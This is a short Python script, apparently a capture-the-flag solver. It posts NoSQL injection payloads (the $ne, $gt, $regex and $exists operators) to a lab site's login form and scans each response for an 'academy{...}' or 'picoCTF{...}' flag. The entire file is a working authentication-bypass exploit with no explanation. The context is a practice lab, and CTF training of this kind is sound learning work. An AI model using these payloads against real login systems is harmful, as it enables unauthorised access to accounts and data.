import sys, re, requests, urllib3
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
payloads = [
    ("name[$ne]=x&pass[$ne]=x", "ne operator"),
    ("name[$gt]=&pass[$gt]=", "gt operator"),
    ("name[$regex]=.*&pass[$regex]=.*", "regex"),
    ("name[$exists]=true&pass[$exists]=true", "exists"),
]
for data, label in payloads:
    try:
        r = requests.post(BASE, data=data, timeout=20,
                          headers={"Content-Type": "application/x-www-form-urlencoded"})
        print("=== %s -> %s (%d octets) ===" % (label, r.status_code, len(r.text)))
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text)
        if m:
            print("FLAG:", m.group(0))
            break
        # extrait du texte utile
        txt = re.sub(r"<[^>]+>", " ", r.text)
        txt = re.sub(r"\s+", " ", txt)
        print(txt[:400])
    except Exception as e:
        print(label, "ERR", type(e).__name__, e)
